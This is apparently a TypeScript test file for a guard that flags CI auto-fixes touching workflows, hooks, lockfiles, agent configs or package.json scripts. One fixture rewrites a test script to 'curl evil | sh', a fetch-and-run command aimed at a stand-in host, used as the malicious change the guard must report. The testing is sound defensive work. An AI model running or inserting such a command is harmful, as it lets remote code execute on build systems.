import {execFileSync} from 'node:child_process';
import {mkdirSync, mkdtempSync, rmSync, writeFileSync} from 'node:fs';
import {tmpdir} from 'node:os';
import {dirname, join} from 'node:path';
import test from 'ava';
import {findRestrictedChanges, restrictedPathReason} from './ci-fix-path-guard';

console.log('\nci-fix-path-guard.spec.ts');

test('restrictedPathReason flags files that run code in CI, git or nanocoder', t => {
	for (const path of [
		'.github/workflows/ci.yml',
		'.gitattributes',
		'.gitmodules',
		'packages/a/.gitignore',
		'.husky/pre-commit',
		'.nanocoder/plugins/x.mjs',
		'agents.config.json',
		'.mcp.json',
		'pnpm-lock.yaml',
		'packages/a/package-lock.json',
		'.pre-commit-config.yaml',
	]) {
		t.truthy(restrictedPathReason(path), path);
	}
	for (const path of ['src/index.ts', 'docs/github.md', 'test/fixtures/x.json', 'README.md']) {
		t.is(restrictedPathReason(path), undefined, path);
	}
});

function git(cwd: string, args: string[]): string {
	return execFileSync('git', args, {cwd, encoding: 'utf-8'}).trim();
}

function repoWith(files: Record<string, string>): {dir: string; base: string} {
	const dir = mkdtempSync(join(tmpdir(), 'ci-fix-guard-'));
	git(dir, ['init', '-q', '--initial-branch=fix']);
	git(dir, ['config', 'user.email', 'test@example.com']);
	git(dir, ['config', 'user.name', 'Test']);
	write(dir, files);
	git(dir, ['add', '-A']);
	git(dir, ['commit', '-q', '-m', 'base']);
	return {dir, base: git(dir, ['rev-parse', 'HEAD'])};
}

function write(dir: string, files: Record<string, string>): void {
	for (const [path, content] of Object.entries(files)) {
		mkdirSync(dirname(join(dir, path)), {recursive: true});
		writeFileSync(join(dir, path), content);
	}
}

function commit(dir: string, files: Record<string, string>): void {
	write(dir, files);
	git(dir, ['add', '-A']);
	git(dir, ['commit', '-q', '-m', 'fix']);
}

const PKG = {name: 'x', version: '1.0.0', scripts: {test: 'ava'}};

test('findRestrictedChanges allows an ordinary fix, including a package.json version bump', async t => {
	const {dir, base} = repoWith({'src/a.ts': 'a', 'package.json': JSON.stringify(PKG)});
	try {
		commit(dir, {
			'src/a.ts': 'fixed',
			'package.json': JSON.stringify({...PKG, version: '1.0.1'}),
		});
		t.deepEqual(await findRestrictedChanges(dir, base, 'fix'), []);
	} finally {
		rmSync(dir, {recursive: true, force: true});
	}
});

test('findRestrictedChanges reports workflow, lockfile and package script changes', async t => {
	const {dir, base} = repoWith({'src/a.ts': 'a', 'package.json': JSON.stringify(PKG)});
	try {
		commit(dir, {
			'src/a.ts': 'fixed',
			'.github/workflows/ci.yml': 'on: push',
			'pnpm-lock.yaml': 'lockfileVersion: 9',
			'package.json': JSON.stringify({...PKG, scripts: {test: 'curl evil | sh'}}),
		});
		const restricted = await findRestrictedChanges(dir, base, 'fix');
		t.deepEqual(restricted.sort(), [
			'.github/workflows/ci.yml (.github/)',
			'package.json (scripts or dependencies)',
			'pnpm-lock.yaml (pnpm-lock.yaml)',
		]);
	} finally {
		rmSync(dir, {recursive: true, force: true});
	}
});
